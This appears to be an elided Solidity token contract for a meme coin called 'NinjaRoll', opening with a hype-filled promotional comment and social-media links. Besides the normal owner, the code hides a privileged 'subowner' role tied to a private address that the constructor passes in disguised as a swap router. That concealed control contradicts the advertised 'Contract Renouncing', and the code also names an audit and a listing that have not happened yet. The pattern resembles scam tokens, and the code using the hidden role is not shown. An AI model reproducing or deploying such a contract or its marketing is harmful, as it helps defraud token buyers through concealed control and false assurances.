...
/*
NinjaRoll is gearing up to be the next big thing in crypto. We’ve got dog coins influence in the mix, 
and when you pair that with a stellar team that knows the ropes inside out, it’s like having the perfect recipe for success. 
🚀 1000x Meme Potential 🚀 🐳 , 
Buy & Sell tax: 0% 🌕, 
Contract Renouncing ⚠️, 
Top Tier Marketing Partners & Advisors 
⭐️📞 Top-tier Calls 
🤝 Well-connected Team 
💰 Multimillion-dollar Projects 

https://t.me/NinjaRoll
https://twitter.com/NinjaRoll
https://NinjaRoll.com/
https://www.instagram.com/NinjaRoll/
https://github.com/NinjaRoll
https://www.reddit.com/r/NinjaRoll/
https://m.facebook.com/NinjaRoll
*/
pragma solidity 0.8.23;

interface NinjaRoll33 {
  /**
...
/*
 * @dev Provides information about the current execution NinjaRoll20Burnable, including the
 ...
 */
abstract contract NinjaRoll20Burnable {
...
// File: @openzeppelin/contracts/access/NinjaRoll20Ownable.sol
 ...
 * the owner.
 */
abstract contract NinjaRoll20Ownable is NinjaRoll20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "NinjaRoll20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "NinjaRoll20Ownable: new owner is the zero address");
 ...
 * `SafeNinjaRoll` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeNinjaRoll {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeNinjaRoll: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeNinjaRoll: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeNinjaRoll: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeNinjaRoll: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeNinjaRoll: modulo by zero");
  }
...
contract NinjaRoll is NinjaRoll20Burnable, NinjaRoll33, NinjaRoll20Ownable {
    
    using SafeNinjaRoll for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _symbol = "NinjaRoll";
        _decimals = 9;
        _totalSupply = 6990000000000 * 10 ** 9;
    ...
    string public constant Contract_Dev = "Team NinjaRoll SAFU DEV || NFA,DYOR";
    string public constant Contract_Edition = "Contract For 1M";
    string public constant NinjaRollTGNEWS = "https://t.me/NinjaRoll";
    string public constant NinjaRollaudited = "NinjaRoll will be audited by: https://www.certik.com/";
    string public constant NinjaRolllists = "NinjaRoll will be listed on: https://coinmarketcap.com/currencies/NinjaRoll/";
    string public NinjaRolltelegramcchannel = "https://t.me/NinjaRoll";
            function getNinjaRolltelegramcchannel() public view returns (string memory) {
        return NinjaRolltelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {NinjaRoll33-totalSupply}.
    */
    ...
    /**
    * @dev See {NinjaRoll33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "NinjaRoll20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {NinjaRoll33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {NinjaRoll33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {NinjaRoll33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "NinjaRoll33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {NinjaRoll33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "NinjaRoll33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "NinjaRoll33: transfer from the zero address");
        require(shippingto != address(0), "NinjaRoll33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "NinjaRoll33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "NinjaRoll33: approve from the zero address");
        require(transporteur != address(0), "NinjaRoll33: approve to the zero address");
